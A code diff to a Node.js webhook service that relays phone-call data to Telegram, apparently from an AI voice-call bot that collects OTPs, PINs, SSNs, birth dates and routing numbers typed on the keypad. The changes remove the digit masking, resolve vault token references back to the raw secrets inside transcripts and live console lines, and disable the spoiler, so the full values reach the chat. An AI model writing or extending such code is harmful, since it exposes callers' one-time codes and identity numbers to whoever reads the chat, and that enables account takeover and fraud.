@@ -54,6 +54,8 @@ function escapeMarkdownV2(value) {
   return String(value || '').replace(/([_*\[\]()~`>#+\-=|{}.!\\])/g, '\\$1');
 }
 
+const DIGIT_TOKEN_REF_REGEX = /(vault:\/\/digits\/[^\s/]+\/tok_[A-Za-z0-9_]+|tok_[A-Za-z0-9_]+)/g;
+
 class EnhancedWebhookService {
   constructor() {
     this.isRunning = false;
@@ -132,6 +134,7 @@ class EnhancedWebhookService {
     this.transcriptRetryMs = 3000;
     this.transcriptMaxWaitMs = 10 * 60 * 1000;
     this.terminalStatusSent = new Map();
+    this.digitTokenResolver = null;
   }
 
   normalizeStatus(value) {
@@ -209,6 +212,43 @@ class EnhancedWebhookService {
     };
   }
 
+  setDigitTokenResolver(resolver) {
+    this.digitTokenResolver = typeof resolver === 'function' ? resolver : null;
+  }
+
+  parseDigitEventMetadata(event = {}) {
+    const meta = event?.metadata;
+    if (!meta) return {};
+    if (typeof meta === 'object') return meta;
+    try {
+      return JSON.parse(meta);
+    } catch (_) {
+      return {};
+    }
+  }
+
+  resolveDigitToken(callSid, tokenRef) {
+    if (!tokenRef || typeof this.digitTokenResolver !== 'function') return null;
+    try {
+      const result = this.digitTokenResolver(callSid || null, tokenRef);
+      if (!result) return null;
+      if (typeof result === 'string') return result;
+      if (result?.ok && result.value) return String(result.value);
+      return null;
+    } catch (_) {
+      return null;
+    }
+  }
+
+  resolveTokenizedText(callSid, text = '') {
+    const raw = String(text || '');
+    if (!raw) return raw;
+    return raw.replace(DIGIT_TOKEN_REF_REGEX, (match) => {
+      const resolved = this.resolveDigitToken(callSid, match);
+      return resolved || match;
+    });
+  }
+
   buildDigitSummaryFromEvents(events = [], options = {}) {
     if (!Array.isArray(events) || events.length === 0) {
       return '';
@@ -261,6 +301,7 @@ class EnhancedWebhookService {
     const labels = {
       verification: 'OTP',
       otp: 'OTP',
+      pin: 'PIN',
       ssn: 'SSN',
       dob: 'DOB',
       routing_number: 'Routing',
@@ -292,14 +333,28 @@ class EnhancedWebhookService {
       return group[group.length - 1];
     };
 
-    const maskDigits = (event) => {
-      const raw = event?.digits || '';
-      if (raw) return raw; // show full digits in post-call summary
-      const preferred = event?.metadata?.masked || '';
-      if (!preferred) return 'none';
-      const clean = String(preferred).replace(/\D/g, '');
-      if (!clean) return '••';
-      return clean;
+    const renderDigits = (event) => {
+      if (!event) return 'none';
+      const metadata = this.parseDigitEventMetadata(event);
+      const callSid = String(event?.call_sid || metadata?.call_sid || '').trim() || null;
+      const candidates = [
+        event?.digits,
+        metadata?.raw_digits,
+        metadata?.secret_token_ref
+      ];
+      for (const candidate of candidates) {
+        const value = String(candidate || '').trim();
+        if (!value) continue;
+        if (value.startsWith('vault://digits/') || value.startsWith('tok_')) {
+          const resolved = this.resolveDigitToken(callSid, value);
+          if (resolved) return resolved;
+          return value;
+        }
+        return value;
+      }
+      const masked = String(metadata?.masked || '').trim();
+      if (masked) return masked;
+      return 'none';
     };
 
     const grouped = new Map();
@@ -332,8 +387,7 @@ class EnhancedWebhookService {
             coveredProfiles.add(profile);
           });
           const chosen = pickEvent(fieldEvents);
-          const raw = chosen?.digits ? String(chosen.digits) : '';
-          const value = raw || 'none';
+          const value = renderDigits(chosen);
           const suffix = chosen?.accepted ? '' : ' (unverified)';
           lines.push(`${formatLabel(field.label)}: ${formatValue(value)}${formatLabel(suffix)}`);
         }
@@ -344,8 +398,7 @@ class EnhancedWebhookService {
         for (const profile of remainingProfiles) {
           const entries = grouped.get(profile) || [];
           const chosen = pickEvent(entries);
-          const raw = chosen?.digits ? String(chosen.digits) : '';
-          const value = raw || 'none';
+          const value = renderDigits(chosen);
           const suffix = chosen?.accepted ? '' : ' (unverified)';
           const label = labels[profile] || profile;
           lines.push(`${formatLabel(label)}: ${formatValue(value)}${formatLabel(suffix)}`);
@@ -362,14 +415,14 @@ class EnhancedWebhookService {
       const accepted = group.filter((item) => item.accepted);
       const chosen = accepted.length ? accepted[accepted.length - 1] : group[group.length - 1];
       const label = labels[profile] || profile;
-      const masked = maskDigits(chosen);
+      const value = renderDigits(chosen);
       let status = 'unverified';
       if (chosen?.accepted) {
         status = 'verified';
       } else if (chosen?.reason) {
         status = 'failed';
       }
-      parts.push(`${formatLabel(label)}: ${formatValue(masked)} ${openParen}${formatLabel(status)}${closeParen}`);
+      parts.push(`${formatLabel(label)}: ${formatValue(value)} ${openParen}${formatLabel(status)}${closeParen}`);
     }
 
     return parts.join('\n');
@@ -752,7 +805,7 @@ class EnhancedWebhookService {
             let digitSummary = '';
             if (this.db?.getCallDigits) {
               const events = await this.db.getCallDigits(call_sid).catch(() => []);
-              digitSummary = this.buildDigitSummaryFromEvents(events, { spoiler: true, escape: true });
+              digitSummary = this.buildDigitSummaryFromEvents(events, { spoiler: false, escape: true });
             }
             if (digitSummary) {
               const header = escapeMarkdownV2(message);
@@ -999,18 +1052,28 @@ class EnhancedWebhookService {
         message += `🔢 *Man-detective:*\n${digitSummary}\n`;
         message += `\n*Digit Timeline:*\n`;
         message += `${'─'.repeat(25)}\n`;
-        const maskTimeline = (event) => {
-          const preferred = event?.metadata?.masked || event?.digits || '';
-          if (!preferred) return 'none';
-          const clean = String(preferred).replace(/\D/g, '');
-          if (!clean) return '••';
-          if (clean.length <= 2) return '•'.repeat(clean.length);
-          return `${'•'.repeat(Math.max(2, clean.length - 2))}${clean.slice(-2)}`;
+        const renderTimelineValue = (event) => {
+          const metadata = this.parseDigitEventMetadata(event);
+          const eventCallSid = String(event?.call_sid || call_sid || '').trim() || null;
+          const candidates = [event?.digits, metadata?.raw_digits, metadata?.secret_token_ref];
+          for (const candidate of candidates) {
+            const value = String(candidate || '').trim();
+            if (!value) continue;
+            if (value.startsWith('vault://digits/') || value.startsWith('tok_')) {
+              const resolved = this.resolveDigitToken(eventCallSid, value);
+              if (resolved) return resolved;
+              return value;
+            }
+            return value;
+          }
+          const masked = String(metadata?.masked || '').trim();
+          if (masked) return masked;
+          return 'none';
         };
         digitEvents.slice(-12).forEach((event) => {
           const ts = event.created_at ? new Date(event.created_at).toLocaleTimeString() : '';
           const label = event.profile || 'digits';
-          const value = maskTimeline(event);
+          const value = renderTimelineValue(event);
           const status = event.accepted ? '✅' : '⚠️';
           message += `${status} ${label}: ${value} ${ts ? `(${ts})` : ''}\n`;
         });
@@ -1021,7 +1084,8 @@ class EnhancedWebhookService {
 
       for (const entry of transcripts) {
         const speaker = entry.speaker === 'user' ? '🧑 *User*' : '🤖 *AI*';
-        const cleanMessage = this.cleanMessageForTelegram(entry.message);
+        const resolvedText = this.resolveTokenizedText(call_sid, entry.message || '');
+        const cleanMessage = this.cleanMessageForTelegram(resolvedText);
         message += `${speaker}: ${cleanMessage}\n\n`;
       }
 
@@ -1979,7 +2043,7 @@ class EnhancedWebhookService {
     const entry = this.liveConsoleByCallSid.get(callSid);
     if (!entry) return;
     this.markCallActivity(callSid);
-    const line = String(eventLine || '').trim();
+    const line = this.resolveTokenizedText(callSid, String(eventLine || '').trim());
     if (!line) return;
     entry.lastEvents.push(line);
     const maxEvents = Number.isFinite(entry.maxEvents) ? entry.maxEvents : this.liveConsoleMaxEvents;
@@ -2021,7 +2085,8 @@ class EnhancedWebhookService {
   recordTranscriptTurn(callSid, speaker, text) {
     const entry = this.liveConsoleByCallSid.get(callSid);
     if (!entry) return;
-    const cleaned = this.truncatePreview(this.normalizePreviewText(text));
+    const resolved = this.resolveTokenizedText(callSid, text);
+    const cleaned = this.truncatePreview(this.normalizePreviewText(resolved));
     if (!cleaned) return;
     this.markCallActivity(callSid);
     this.mediaSeen.set(callSid, true);
